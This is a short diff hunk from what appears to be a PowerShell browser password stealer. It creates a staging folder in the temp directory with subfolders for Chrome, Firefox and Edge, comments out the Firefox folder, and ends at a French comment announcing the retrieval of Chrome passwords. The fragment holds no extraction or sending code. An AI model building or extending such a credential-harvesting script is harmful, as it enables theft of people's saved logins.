@@ -30,7 +30,7 @@ $ZIP = "$FolderName.zip"
 $DestinationPath = "$env:TEMP/$FolderName"
 New-Item -Path $DestinationPath -ItemType Directory
 New-Item -Path "$DestinationPath\google" -ItemType Directory
-New-Item -Path "$DestinationPath\firefox" -ItemType Directory
+#New-Item -Path "$DestinationPath\firefox" -ItemType Directory
 New-Item -Path "$DestinationPath\edge" -ItemType Directory
 
 # Récupération des mots de passe Google Chrome
